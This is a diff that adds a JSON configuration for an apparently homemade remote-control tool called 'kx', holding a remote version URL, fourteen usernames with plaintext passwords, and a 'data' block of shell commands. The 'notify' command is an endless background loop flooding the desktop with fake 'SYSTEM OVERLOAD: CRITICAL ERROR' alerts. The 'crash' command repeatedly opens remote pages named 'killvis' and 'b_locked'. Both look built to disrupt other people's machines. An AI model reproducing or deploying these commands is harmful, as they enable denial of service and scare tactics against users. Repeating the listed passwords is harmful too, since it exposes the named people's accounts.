@@ -1,0 +1,141 @@
+{
+  "kx": {
+    "version": [
+      {
+        "version": "1.3",
+        "enforce": "true",
+        "url": "https://ominous-funicular-5grgr4xp56pjf95x-3000.app.github.dev/kxinternet.txt"
+      }
+    ],
+    "users": [
+      {
+        "allow": "true",
+        "username": "khang",
+        "password": "chicken"
+      },
+      {
+        "allow": "true",
+        "username": "jj",
+        "password": "i<3helena",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "jonah",
+        "password": "dbook1",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "levin",
+        "password": "gg3k",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "david",
+        "password": "jessica",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "eyor",
+        "password": "ilovegod33",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "danny",
+        "password": "1-21-13",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "francis",
+        "password": "itachi",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "jonathan",
+        "password": "chao12346",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "ameer",
+        "password": "mermer67",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "austin",
+        "password": "1234",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "braylon",
+        "password": "Crusaders2030!",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "jumar",
+        "password": "Prayer100$",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      },
+      {
+        "allow": "true",
+        "username": "bemenet",
+        "password": "may27",
+        "notify": "false",
+        "crash": "false",
+        "xdg-open": "",
+        "garcon-url-handler": ""
+      }
+    ],
+    "data": [
+      {
+        "crash": "garcon-url-handler https://21341414.github.io/kxproducts/internet/killvis.html; sleep 5; garcon-url-handler https://21341414.github.io/kxproducts/internet/b_locked.html; sleep 5; garcon-url-handler https://21341414.github.io/kxproducts/internet/killvis.html; sleep 5; garcon-url-handler https://21341414.github.io/kxproducts/internet/b_locked.html",
+        "notify": "while true; do notify-send -u critical '⚠️ SYSTEM ⚠️ ' 'KX SYSTEM OVERLOAD: CRITICAL ERROR' -i dialog-warning >/dev/null 2>&1 & done &"
+      }
+    ]
+  }
+}
